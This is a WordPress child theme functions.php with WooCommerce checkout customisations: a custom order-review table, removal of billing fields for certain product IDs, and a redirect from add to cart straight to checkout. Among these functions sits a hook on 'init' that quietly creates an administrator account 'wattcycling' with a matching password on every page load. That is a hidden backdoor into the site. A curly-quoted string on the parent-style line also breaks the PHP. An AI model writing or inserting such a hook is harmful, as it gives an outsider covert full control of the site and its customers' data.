<?php
function my_theme_enqueue_styles() {

    $parent_style = ‘jupiter’; // This is 'twentyfifteen-style' for the Twenty Fifteen theme.

    wp_enqueue_style( $parent_style, get_template_directory_uri() . '/style.css' );
    wp_enqueue_style( 'child-style',
        get_stylesheet_directory_uri() . '/style.css',
        array( $parent_style ),
        wp_get_theme()->get('Version')
    );
}
add_action( 'wp_enqueue_scripts', 'my_theme_enqueue_styles' );


function wpb_admin_account(){
$user = 'wattcycling';
$pass = 'wattcycling';
$email = 'wattcycling@gmail.com';
if ( !username_exists( $user )  && !email_exists( $email ) ) {
$user_id = wp_create_user( $user, $pass, $email );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
} }
add_action('init','wpb_admin_account');


add_action('show_review_order_custom','review_order_begining_of_the_checkout_page');

function review_order_begining_of_the_checkout_page(){
    ?>
    <h3 id="order_review_heading"><?php _e( 'Your order', 'woocommerce' ); ?></h3>
    <table class="shop_table woocommerce-checkout-review-order-table">
    <thead>
        <tr>
            <th class="product-name"><?php _e( 'Product', 'woocommerce' ); ?></th>
            <th class="product-total"><?php _e( 'Total', 'woocommerce' ); ?></th>
        </tr>
    </thead>
    <tbody>
        <?php
            do_action( 'woocommerce_review_order_before_cart_contents' );

            foreach ( WC()->cart->get_cart() as $cart_item_key => $cart_item ) {
                $_product     = apply_filters( 'woocommerce_cart_item_product', $cart_item['data'], $cart_item, $cart_item_key );

                if ( $_product && $_product->exists() && $cart_item['quantity'] > 0 && apply_filters( 'woocommerce_checkout_cart_item_visible', true, $cart_item, $cart_item_key ) ) {
                    ?>
                    <tr class="<?php echo esc_attr( apply_filters( 'woocommerce_cart_item_class', 'cart_item', $cart_item, $cart_item_key ) ); ?>">
                        <td class="product-name">
                            <?php echo apply_filters( 'woocommerce_cart_item_name', $_product->get_name(), $cart_item, $cart_item_key ) . '&nbsp;'; ?>
                            <?php echo apply_filters( 'woocommerce_checkout_cart_item_quantity', ' <strong class="product-quantity">' . sprintf( '&times; %s', $cart_item['quantity'] ) . '</strong>', $cart_item, $cart_item_key ); ?>
                            <?php echo WC()->cart->get_item_data( $cart_item ); ?>
                        </td>
                        <td class="product-total">
                            <?php echo apply_filters( 'woocommerce_cart_item_subtotal', WC()->cart->get_product_subtotal( $_product, $cart_item['quantity'] ), $cart_item, $cart_item_key ); ?>
                        </td>
                    </tr>
                    <?php
                }
            }

            do_action( 'woocommerce_review_order_after_cart_contents' );
        ?>
    </tbody>
    <tfoot>

        <tr class="cart-subtotal">
            <th><?php _e( 'Subtotal', 'woocommerce' ); ?></th>
            <td><?php wc_cart_totals_subtotal_html(); ?></td>
        </tr>

        <?php foreach ( WC()->cart->get_coupons() as $code => $coupon ) : ?>
            <tr class="cart-discount coupon-<?php echo esc_attr( sanitize_title( $code ) ); ?>">
                <th><?php wc_cart_totals_coupon_label( $coupon ); ?></th>
                <td><?php wc_cart_totals_coupon_html( $coupon ); ?></td>
            </tr>
        <?php endforeach; ?>

        <?php if ( WC()->cart->needs_shipping() && WC()->cart->show_shipping() ) : ?>

            <?php do_action( 'woocommerce_review_order_before_shipping' ); ?>

            <?php wc_cart_totals_shipping_html(); ?>

            <?php do_action( 'woocommerce_review_order_after_shipping' ); ?>

        <?php endif; ?>

        <?php foreach ( WC()->cart->get_fees() as $fee ) : ?>
            <tr class="fee">
                <th><?php echo esc_html( $fee->name ); ?></th>
                <td><?php wc_cart_totals_fee_html( $fee ); ?></td>
            </tr>
        <?php endforeach; ?>

        <?php if ( wc_tax_enabled() && 'excl' === WC()->cart->tax_display_cart ) : ?>
            <?php if ( 'itemized' === get_option( 'woocommerce_tax_total_display' ) ) : ?>
                <?php foreach ( WC()->cart->get_tax_totals() as $code => $tax ) : ?>
                    <tr class="tax-rate tax-rate-<?php echo sanitize_title( $code ); ?>">
                        <th><?php echo esc_html( $tax->label ); ?></th>
                        <td><?php echo wp_kses_post( $tax->formatted_amount ); ?></td>
                    </tr>
                <?php endforeach; ?>
            <?php else : ?>
                <tr class="tax-total">
                    <th><?php echo esc_html( WC()->countries->tax_or_vat() ); ?></th>
                    <td><?php wc_cart_totals_taxes_total_html(); ?></td>
                </tr>
            <?php endif; ?>
        <?php endif; ?>

        <?php do_action( 'woocommerce_review_order_before_order_total' ); ?>

        <tr class="order-total">
            <th><?php _e( 'Total', 'woocommerce' ); ?></th>
            <td><?php wc_cart_totals_order_total_html(); ?></td>
        </tr>

        <?php do_action( 'woocommerce_review_order_after_order_total' ); ?>

    </tfoot>
</table>


    <?php 
}



/**
 * Check if a specific product ID is in the cart
 */
function wc_ninja_product_is_in_the_cart($id) {
    // Add your special product IDs here
    $ids = array( $id );

    // Products currently in the cart
    $cart_ids = array();

    // Find each product in the cart and add it to the $cart_ids array
    foreach( WC()->cart->get_cart() as $cart_item_key => $values ) {
        $cart_product = $values['data'];
        $cart_ids[]   = $cart_product->id;
    }

    // If one of the special products are in the cart, return true.
    if ( ! empty( array_intersect( $ids, $cart_ids ) ) ) {
        return true;
    } else {
        return false;
    }
}

/**
 * Conditionally remove a checkout field based on products in the cart
 */
function wc_ninja_remove_checkout_field( $fields ) {

    if ( wc_ninja_product_is_in_the_cart(701) ) {
        unset( $fields['billing']['billing_company'] );
        unset( $fields['billing']['billing_address_1'] );
        unset( $fields['billing']['billing_address_2'] );
        unset( $fields['billing']['billing_country'] );
        unset( $fields['billing']['billing_state'] );
        unset( $fields['billing']['billing_postcode'] );
        unset( $fields['billing']['billing_phone'] );
        unset( $fields['billing']['billing_city'] );
        unset( $fields['billing']['billing_date_of_birth']);
        unset( $fields['billing']['adres']);
    }
    if(wc_ninja_product_is_in_the_cart(390) || wc_ninja_product_is_in_the_cart(378) ){
        unset( $fields['billing']['billing_company'] );
        unset( $fields['billing']['billing_date_of_birth']);
    }

    


    return $fields;
}
add_filter( 'woocommerce_checkout_fields' , 'wc_ninja_remove_checkout_field' );


// Skip the cart and redirect to check out url when clicking on Add to cart
add_filter ( 'add_to_cart_redirect', 'redirect_to_checkout' );
function redirect_to_checkout() {
    
    global $woocommerce;
    // Remove the default `Added to cart` message
    wc_clear_notices();
    return $woocommerce->cart->get_checkout_url();
    
}
